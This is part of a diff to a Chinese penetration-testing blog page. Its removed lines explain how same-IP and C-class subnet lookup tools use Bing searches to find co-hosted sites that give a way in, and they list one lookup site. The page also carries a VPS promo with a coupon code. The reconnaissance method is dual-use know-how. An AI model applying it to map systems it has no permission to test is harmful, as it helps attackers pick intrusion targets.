-<p><br><br>3,关于旁站/C段工具的基本编写原理<br>市面上这类的工具多如牛毛,但各有优劣(可能是用的接口质量的不同吧),但大多数都是通过bing的接口,把查询到的结果数据中的旁站链接提取出来,C段和旁站唯一不一样的地方,就是C段是把整个段的ip上的旁站都轮询一遍,不过在此之前你需要先申请一下bing的搜索api,其实我自己是不怎么用这类的工具的[不太准],基本都是手工直接在bing里面,ip:*慢慢分析找入手点的,因为工具本身可能会漏掉很多有价值的参考信息,反正我们的目的就是找个站能进去的站即可,怎么找,随意,你自己觉得怎么快就怎么来,渗透在乎更多的是结果和效率,过程几乎不会太在意<br><br><br>4,好了,这部分内容确实比较简单,工具也没太多技术含量,单纯只是为了理解一些基本概念而已,这里就不多说了<br><br></p>
-<h5 id="一些提供类似功能的工具站-之前好用的-现在大多已经失效了-后期遇到好的再贴上来"><a href="#一些提供类似功能的工具站-之前好用的-现在大多已经失效了-后期遇到好的再贴上来" class="headerlink" title="一些提供类似功能的工具站,之前好用的,现在大多已经失效了,后期遇到好的再贴上来:"></a>一些提供类似功能的工具站,之前好用的,现在大多已经失效了,后期遇到好的再贴上来:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.sameip.org/</span></div></pre></td></tr></table></figure>
-
-        </div>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -577,7 +806,7 @@
 
 <footer class="footer-content">
 
-<center>如果有朋友需要优质vps,可以去<a href="http://www.laoxuehost.com/vps/" target="_blank">老薛</a>买,异常稳定,本人已自用多年,使用下面的优惠码,会有 <font color="red">25% </font>的折扣哦...</center><br>
+<center>如果有朋友需要优质vps,可以去<a href="http://www.laoxuehost.com/vps/" target="_blank">老薛</a>买,异常稳定,本人已自用多年,使用下面的优惠码, <font color="red">25% </font>的折扣哦...</center><br>
 至少,在同等质量的vps中,已经算是非常好的了,起码自己平时 youtube 1080 基本是没什么问题<br>
 <br>
 <a href="http://www.laoxuehost.com/vps/" target="_blank" > 购买老薛vps </a> &nbsp;&nbsp;&nbsp;&nbsp; 优惠码: <font color="red">nuddle123</font><br>
@@ -646,7 +875,7 @@ document.getElementById("showDays").innerHTML = " 其实博客已默默坚挺了
         </div>
     </div>
 		<audio autoplay="autoplay">
-		<source src="/img/Good Time.mp3" type="audio/mpeg" />
+		<source src="/img/call you tonight.mp3" type="audio/mpeg" />
 		</audio>
 </footer>
 
